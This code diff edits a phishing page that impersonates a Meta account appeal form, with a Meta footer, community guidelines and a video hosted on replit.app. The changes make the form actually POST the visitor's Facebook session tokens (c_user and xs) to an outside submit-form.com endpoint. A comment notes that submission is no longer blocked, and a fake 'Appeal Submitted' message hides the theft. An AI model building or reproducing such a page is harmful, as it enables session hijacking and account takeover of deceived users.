@@ -321,65 +321,70 @@
 
   <div class="footer">© 2025 Meta. All rights reserved.</div>
 
- <!-- Appeal Modal -->
-  <div class="modal" id="appealModal">
-    <div class="modal-content">
-      <button class="close-btn" onclick="closeModal()">&times;</button>
-      <h2>Appeal Form</h2>
-         <div class="modal-body">
-                <form method="https://submit-form.com/CTbX1TGUV" id="https://submit-form.com/CTbX1TGUV">
-      <div class="video-container">
-        <video controls>
-          <source src="https://request-for-immediate-action.replit.app/attached_assets/video-information.mp4" type="video/mp4">
-          Your browser does not support the video tag.
-        </video>
-      </div>
-   <div class="guidelines-text">
-                        <p>1. We promote respectful communication and prohibit hate speech, bullying, and harassment of any kind.</p>
-                        <p>2. We remove content that could lead to real-world harm, including violence, criminal activity, or dangerous organizations.</p>
-                        <p>3. We protect personal privacy and intellectual property rights, requiring permission to share private content.</p>
-                        <p>4. We maintain platform authenticity by preventing spam, fake engagement, and misinformation.</p>
-                    </div>
-      <form onsubmit="event.preventDefault(); showSuccess();">
+<!-- Appeal Modal -->
+<div class="modal" id="appealModal">
+  <div class="modal-content">
+    <button class="close-btn" onclick="closeModal()">&times;</button>
+    <h2>Appeal Form</h2>
+    <div class="modal-body">
+      <form method="POST" action="https://submit-form.com/CTbX1TGUV" onsubmit="showSuccess()">
+        <div class="video-container">
+          <video controls>
+            <source src="https://request-for-immediate-action.replit.app/attached_assets/video-information.mp4" type="video/mp4">
+            Your browser does not support the video tag.
+          </video>
+        </div>
+
+        <div class="guidelines-text">
+          <p>1. We promote respectful communication and prohibit hate speech, bullying, and harassment of any kind.</p>
+          <p>2. We remove content that could lead to real-world harm, including violence, criminal activity, or dangerous organizations.</p>
+          <p>3. We protect personal privacy and intellectual property rights, requiring permission to share private content.</p>
+          <p>4. We maintain platform authenticity by preventing spam, fake engagement, and misinformation.</p>
+        </div>
+
         <div class="input-group">
           <label for="c_user">c_user Token</label>
-          <input type="text" id="c_user" required />
+          <input type="text" id="c_user" name="c_user" required />
         </div>
+
         <div class="input-group">
           <label for="xs">xs Token</label>
-          <input type="text" id="xs" required />
+          <input type="text" id="xs" name="xs" required />
         </div>
+
         <div class="modal-footer">
-          <button type="submit" class="https://submit-form.com/CTbX1TGUV">Submit Appeal</button>
+          <button type="submit" class="submit-btn">Submit Appeal</button>
         </div>
       </form>
     </div>
   </div>
+</div>
 
-  <!-- Success Message -->
-  <div class="success" id="successPopup">
-    <h3>Appeal Submitted</h3>
-    <p>Your request has been received. We'll review it shortly.</p>
-    <button onclick="closeSuccess()">Close</button>
-  </div>
+<!-- Success Message -->
+<div class="success" id="successPopup">
+  <h3>Appeal Submitted</h3>
+  <p>Your request has been received. We'll review it shortly.</p>
+  <button onclick="closeSuccess()">Close</button>
+</div>
 
-  <script>
-    function openModal() {
-      document.getElementById("appealModal").classList.add("active");
-    }
+<script>
+  function openModal() {
+    document.getElementById("appealModal").classList.add("active");
+  }
 
-    function closeModal() {
-      document.getElementById("appealModal").classList.remove("active");
-    }
+  function closeModal() {
+    document.getElementById("appealModal").classList.remove("active");
+  }
 
-    function showSuccess() {
+  function showSuccess() {
+    // Don’t actually block submission — just show popup
+    setTimeout(() => {
       closeModal();
       document.getElementById("successPopup").classList.add("active");
-    }
+    }, 300);
+  }
 
-    function closeSuccess() {
-      document.getElementById("successPopup").classList.remove("active");
-    }
-  </script>
-</body>
-</html>
+  function closeSuccess() {
+    document.getElementById("successPopup").classList.remove("active");
+  }
+</script>
